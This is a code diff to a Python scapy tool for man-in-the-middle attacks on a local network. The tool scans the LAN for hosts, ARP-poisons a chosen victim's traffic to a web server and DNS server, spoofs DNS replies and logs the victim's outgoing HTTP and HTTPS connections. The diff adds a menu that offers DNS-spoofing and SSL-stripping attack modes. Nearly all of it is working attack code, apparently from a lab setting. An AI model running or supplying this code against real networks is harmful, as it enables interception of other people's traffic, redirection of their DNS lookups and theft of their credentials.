@@ -3,6 +3,7 @@ import time
 import threading
 import netfilterqueue
 import subprocess
+import sys
 
 # Network variables
 DNS_SERVER_IP = "192.168.50.30" # IP of the targeted DNS server
@@ -23,13 +24,13 @@ def get_mac(ip):
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=INTERFACE)[0]
     return answered_list[0][1].hwsrc
 
-def spoof(VICTIM_IP, spoof_ip):
+def arp_poinson(VICTIM_IP, spoof_ip):
     mac_target = get_mac(VICTIM_IP)
     packet = scapy.ARP(op=2, pdst=VICTIM_IP, hwdst=mac_target, psrc=spoof_ip)
     ether_frame = scapy.Ether(dst=mac_target)
     scapy.sendp(ether_frame / packet, verbose=False, iface=INTERFACE)
 
-def restore(destination_ip, source_ip):
+def restore_ARP_table(destination_ip, source_ip):
     destination_ip_mac = get_mac(destination_ip)
     source_ip_mac = get_mac(source_ip)
     ether_frame = scapy.Ether(dst=destination_ip_mac)
@@ -137,7 +138,7 @@ def start_dns_spoofing():
         queue.run()
         
     except KeyboardInterrupt:
-        print("\nStopping DNS spoofing...")
+        print("\nStopping DNS spoofing")
         queue.unbind()
         cleanup_iptables()
         
@@ -158,16 +159,12 @@ def sniff_outgoing_packets(victim_ip):
         elif packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == 443:
             print(f"[HTTPS from {victim_ip}] to {packet[scapy.IP].dst}")
     
-    print(f"Starting to sniff outgoing packets from {victim_ip}...")
+    print(f"Starting to sniff outgoing packets from {victim_ip}")
 
     # Start sniffing and call function on every packet recieved
     scapy.sniff(prn=packet_callback, filter=f"ip src {victim_ip}", store=0, iface=INTERFACE)
 
 def run_arp_poisoning(victim, server=WEB_SERVER_IP):
-     # Start DNS spoofing thread
-    dns_thread = threading.Thread(target=start_dns_spoofing, daemon=True)
-    dns_thread.start()
-    
     # Start sniffing thread
     sniff_thread = threading.Thread(target=sniff_outgoing_packets, args=(victim,), daemon=True)
     sniff_thread.start()
@@ -176,41 +173,76 @@ def run_arp_poisoning(victim, server=WEB_SERVER_IP):
     print(f"Starting ARP poisoning: {victim} <-> {server}")
     try:
         while True:
-            spoof(victim, server)
-            spoof(server, victim)
-            spoof(victim,DNS_SERVER_IP)
-            spoof(DNS_SERVER_IP,victim)
+            arp_poinson(victim, server)
+            arp_poinson(server, victim)
+            arp_poinson(victim,DNS_SERVER_IP)
+            arp_poinson(DNS_SERVER_IP,victim)
             sent_packets_count = sent_packets_count + 2
             #print(f"\rPackets Sent: {sent_packets_count}", end="")
             
             time.sleep(2)
 
     except KeyboardInterrupt:
-        restore(victim, server)
-        restore(server, victim)
-        restore(victim,DNS_SERVER_IP)
-        restore(DNS_SERVER_IP,victim)
+        restore_ARP_table(victim, server)
+        restore_ARP_table(server, victim)
+        restore_ARP_table(victim,DNS_SERVER_IP)
+        restore_ARP_table(DNS_SERVER_IP,victim)
         cleanup_iptables()
         print("\nAttack stopped and ARP tables restored")
 
+def select_attack_target():
+    try:
+        request = scapy.ARP(pdst=NETWORK_RANGE)
+        ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = ether / request
+        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=INTERFACE)[0]
+
+        hosts = []
+
+        for sent, received in answered_list:
+            hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
+        print("Available devices in the network:")
+        print("IP\t\t\tMAC Address\n-----------------------------------------")
+        for host in hosts:
+            print(f"{host['ip']}\t\t{host['mac']}")
+        request_input = input("Select the target IP address: ").strip()
+
+        if request_input in [host['ip'] for host in hosts]:    
+            return(request_input)
+        else: 
+            print("\nInvalid target")
+            sys.exit(0)
+
+    except KeyboardInterrupt:
+        print("\nAttack stopped")
+        sys.exit(0)
+
+def select_attack_type():
+    print("\nAvailable attacks:")
+    print("1 - ARP + DNS spoofing")
+    print("2 - ARP + SSL stripping")
+    try:
+        attack_type = input("Select attack type you would like to use by entering its number: ").strip()
+        return attack_type
+    except KeyboardInterrupt:
+        print("\nAttack stopped")
+        sys.exit(0)
+
 def main():
-    request = scapy.ARP(pdst=NETWORK_RANGE)
-    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = ether / request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=INTERFACE)[0]
+    victim = select_attack_target()
+    attack_type = select_attack_type()
 
-    hosts = []
+    if(attack_type == "1"):
+        # Start DNS spoofing thread
+        dns_thread = threading.Thread(target=start_dns_spoofing, daemon=True)
+        dns_thread.start()
+        run_arp_poisoning(victim)
 
-    for sent, received in answered_list:
-        hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
-    print("Available devices in the network:")
-    print("IP\t\t\tMAC Address\n-----------------------------------------")
-    for host in hosts:
-        print(f"{host['ip']}\t\t{host['mac']}")
-    request_input = input("Select the target IP address: ").strip()
-    if request_input in [host['ip'] for host in hosts]:    
-        run_arp_poisoning(request_input)
-    else: print("\nInvalid target")
+    elif(attack_type == "2"):
+        run_arp_poisoning(victim)
+
+    else: 
+        print("\nInvalid attack type")
 
 if __name__ == "__main__":
     main()
